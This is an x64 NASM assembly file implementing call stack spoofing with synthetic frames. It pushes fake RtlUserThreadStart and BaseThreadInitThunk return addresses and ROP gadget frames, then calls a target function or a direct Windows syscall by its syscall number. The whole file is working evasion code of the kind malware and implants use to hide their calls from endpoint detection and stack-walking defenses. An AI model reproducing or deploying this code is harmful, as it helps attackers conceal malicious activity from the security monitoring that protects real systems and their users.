;;
;; Code responsible for Call Stack Spoofing Via Synthetic (NASM)
;;
[BITS 64]

;;
;; Export
;;
GLOBAL SpoofSynthetic

[SECTION .data]

;;
;; Configuration structure passed to the spoof ASM routine
;;
STRUC Config
    .RtlUserThreadStartAddr       RESQ 1
    .RtlUserThreadStartFrameSize  RESQ 1
    
    .BaseThreadInitThunkAddr      RESQ 1
    .BaseThreadInitThunkFrameSize RESQ 1

    .FirstFrame                   RESQ 1
    .SecondFrame                  RESQ 1
    .JmpRbxGadget                 RESQ 1
    .AddRspXGadget                RESQ 1

    .FirstFrameSize               RESQ 1
    .SecondFrameSize              RESQ 1
    .JmpRbxGadgetFrameSize        RESQ 1
    .AddRspXGadgetFrameSize       RESQ 1

    .RbpOffset                    RESQ 1

    .SpooFunction                 RESQ 1
    .ReturnAddress                RESQ 1

    .IsSyscall                    RESD 1
    .Ssn                          RESD 1

    .NArgs                        RESQ 1
    .Arg01                        RESQ 1
    .Arg02                        RESQ 1
    .Arg03                        RESQ 1
    .Arg04                        RESQ 1
    .Arg05                        RESQ 1
    .Arg06                        RESQ 1
    .Arg07                        RESQ 1
    .Arg08                        RESQ 1
    .Arg09                        RESQ 1
    .Arg10                        RESQ 1
    .Arg11                        RESQ 1
ENDSTRUC

[SECTION .text]

;;
;; Function responsible for Call Stack Spoofing
;;
SpoofSynthetic:
    ;;
    ;; Saving non-vol registers
    ;;
    push QWORD rbp
    push QWORD rbx
    push QWORD r15

    ;;
    ;; Everything between RSP and RBP is our new stack frame for unwinding 
    ;;
    sub rsp, 210h
    mov rbp, rsp

    ;;
    ;; Creating stack pointer to Restore PROC
    ;;
    lea rax, [rel RestoreSynthetic]
    push rax
    lea rbx, [rsp]

    ;;
    ;; Cutting the call stack. The 0 pushed in this position will be the return address
    ;; of the next frame "RtlUserThreadStart", making it effectively the originating function
    ;;
    xor rax, rax
    push rax
    
    ;;
    ;; RtlUserThreadStart
    ;;
    sub rsp, [rcx + Config.RtlUserThreadStartFrameSize]
    push QWORD [rcx + Config.RtlUserThreadStartAddr]
    add QWORD [rsp], 21h

    ;;
    ;; BaseThreadInitThunk
    ;;
    sub rsp, [rcx + Config.BaseThreadInitThunkFrameSize]
    push QWORD [rcx + Config.BaseThreadInitThunkAddr]                          
    add QWORD [rsp], 14h

    ;;
    ;; Return Adress
    ;;
    mov rax, rsp

    ;;
    ;; First Frame (Fake origin)
    ;;
    push QWORD [rcx + Config.FirstFrame]
    sub rax, [rcx + Config.FirstFrameSize]

    sub rsp, [rcx + Config.SecondFrameSize]
    mov r10, [rcx + Config.RbpOffset]
    mov [rsp + r10], rax
    
    ;;
    ;; ROP Frames
    ;;
    push QWORD [rcx + Config.SecondFrame]

    ;;
    ;; JMP [RBX] Gadget / Stack Pivot (To restore original Control Flow Stack)
    ;;
    sub rsp, [rcx + Config.JmpRbxGadgetFrameSize]
    push QWORD [rcx + Config.JmpRbxGadget]

    sub rsp, [rcx + Config.AddRspXGadgetFrameSize]
    push QWORD [rcx + Config.AddRspXGadget]

    ;;
    ;; Set the pointer to the function to call in R11
    ;;
    mov r11, [rcx + Config.SpooFunction]
    jmp ParametersSynthetic

;;
;; Set the parameters to pass to the target function
;;
ParametersSynthetic:
    mov r12, rcx 
    mov rax, [r12 + Config.NArgs]
    
    ; Arg01 (rcx)
    cmp rax, 1
    jb skip_1
    mov rcx, [r12 + Config.Arg01]

skip_1:
    ; Arg02 (rdx)
    cmp rax, 2
    jb skip_2
    mov rdx, [r12 + Config.Arg02]

skip_2:
    ; Arg03 (r8)
    cmp rax, 3
    jb skip_3
    mov r8, [r12 + Config.Arg03]
    
skip_3:
    ; Arg04 (r9)
    cmp rax, 4
    jb skip_4
    mov r9, [r12 + Config.Arg04]

skip_4:
    ; Stack-based args
    lea r13, [rsp] 

    cmp rax, 5
    jb skip_5
    mov r10, [r12 + Config.Arg05]
    mov [r13 + 28h], r10

skip_5:
    ; Arg06
    cmp rax, 6
    jb skip_6
    mov r10, [r12 + Config.Arg06]
    mov [r13 + 30h], r10

skip_6:
    ; Arg07
    cmp rax, 7
    jb skip_7
    mov r10, [r12 + Config.Arg07]
    mov [r13 + 38h], r10

skip_7:
    ; Arg08
    cmp rax, 8
    jb skip_8
    mov r10, [r12 + Config.Arg08]
    mov [r13 + 40h], r10
    
skip_8:
    ; Arg09
    cmp rax, 9
    jb skip_9
    mov r10, [r12 + Config.Arg09]
    mov [r13 + 48h], r10

skip_9:
    ; Arg10
    cmp rax, 10
    jb skip_10
    mov r10, [r12 + Config.Arg10]
    mov [r13 + 50h], r10

skip_10:
    ; Arg11
    cmp rax, 11
    jb skip_11
    mov r10, [r12 + Config.Arg11]
    mov [r13 + 58h], r10

skip_11:
    cmp BYTE [r12 + Config.IsSyscall], 1
    je ExecuteSyscallSynthetic

    jmp ExecuteSynthetic

;;
;; Restores the original stack frame
;;
RestoreSynthetic:
    mov rsp, rbp
    add QWORD rsp, 210h
    pop QWORD r15
    pop QWORD rbx
    pop QWORD rbp
    ret

;;
;; Executes the target function
;;
ExecuteSynthetic:
    jmp r11

;;
;; Executes a native Windows system call using the spoofed context
;;
ExecuteSyscallSynthetic:
    mov r10, rcx
    mov eax, DWORD [r12 + Config.Ssn]
    jmp r11